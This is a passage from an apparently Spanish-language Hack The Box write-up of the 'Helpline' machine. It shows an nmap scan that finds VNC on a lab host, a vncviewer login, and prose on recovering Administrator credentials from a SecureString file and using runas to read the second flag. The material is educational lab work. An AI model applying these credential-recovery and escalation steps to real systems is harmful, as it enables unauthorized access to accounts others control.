nmap -p5900 -v -n 10.10.10.132
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 13:09 GMT
Initiating Ping Scan at 13:09
Scanning 10.10.10.132 [4 ports]
Completed Ping Scan at 13:09, 0.30s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:09
Scanning 10.10.10.132 [1 port]
Discovered open port 5900/tcp on 10.10.10.132
Completed SYN Stealth Scan at 13:09, 0.09s elapsed (1 total ports)
Nmap scan report for 10.10.10.132
Host is up (0.22s latency).

PORT     STATE SERVICE
5900/tcp open  vnc

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

Me conecto con VNCviewer con la contraseña definida en la instalación

```null
vncviewer 10.10.10.132
```

<img src="/writeups/assets/img/Helpline-htb/9.png" alt="">

Desde esa sesión no es necesario que desencripte el archivo con la contraseña de Administrator, aunque está en formato SecureString

<img src="/writeups/assets/img/Helpline-htb/10.png" alt="">

Puedo realizar el proceso inverso y obtener las credenciales del usuario Administrador, que no pertenece al grupo Remote Management Users.

<img src="/writeups/assets/img/Helpline-htb/11.png" alt="">

Con runas me convierto en el usuario Administrador y visualizo la segunda flag

<img src="/writeups/assets/img/Helpline-htb/12.png" alt="">